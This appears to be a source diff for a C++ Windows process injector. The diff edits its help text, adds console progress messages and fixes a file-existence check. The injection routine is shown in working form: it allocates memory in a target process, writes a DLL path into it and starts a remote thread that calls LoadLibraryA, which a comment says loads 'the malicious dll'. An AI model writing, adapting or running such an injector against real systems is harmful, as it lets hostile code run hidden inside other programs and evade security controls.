@@ -1,10 +1,10 @@
-#include "injector_helper.h"
+#include "injector_helper.h" 
 
 void help()
 {
 	std::cout << "************************ HELP *************************" << std::endl;
 	std::cout << "Specify valid target process ID and DLL Path to inject." << std::endl;
-	std::cout << "process_injector.exe <procId> <dllPath>" << std::endl;
+	std::cout << "injector.exe <procId> <dllPath>" << std::endl;
 	std::cout << "*******************************************************" << std::endl;
 	exit(-1);
 }
@@ -26,13 +26,17 @@ void injectDll(DWORD procId, LPCSTR dllPath)
 	}
 	else
 	{
+		std::cout << "Process handle = " << hProcess << std::endl;
+		std::cout << "Allocate memory for payload path." << std::endl;
 		// Allocate memory for the dllpath in the target process
 		// Length of the path string + null terminator
 		LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
 
+		std::cout << "Write the path to the address of the memory allocated." << std::endl;
 		// Write the path to the address of the memory allocated above
 		WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
 
+		std::cout << "Create remote thread in the target process (" << procId << ")" << std::endl;
 		// Create a remote thread in the target process which calls the LoadLibraryA to load the malicious dll
 		HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
 			(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"),
@@ -41,7 +45,8 @@ void injectDll(DWORD procId, LPCSTR dllPath)
 		// Wait for execution of our loader thread to finish
 		WaitForSingleObject(hLoadThread, INFINITE);
 
-		std::cout << "DLL path allocated at: " << pDllPath << std::endl;
+		std::cout << "DLL path allocated at = " << pDllPath << std::endl;
+		std::cout << "Press any key to exit" << std::endl;
 		std::cin.get();
 
 		// Free the memory allocated for our dll path
@@ -82,15 +87,14 @@ DWORD convertFrom(char *str)
 bool fileExists(const char *filePath)
 {
 	bool validFilePath = true;
-	FILE **filePtr = NULL;
-	fopen_s(filePtr, filePath, "r");
+	FILE *filePtr = fopen(filePath, "r");
 	if (filePtr == NULL)
 	{
 		validFilePath = false;
 	}
 	else
 	{
-		fclose(*filePtr);
+		fclose(filePtr);
 		validFilePath = true;
 	}
 	return validFilePath;
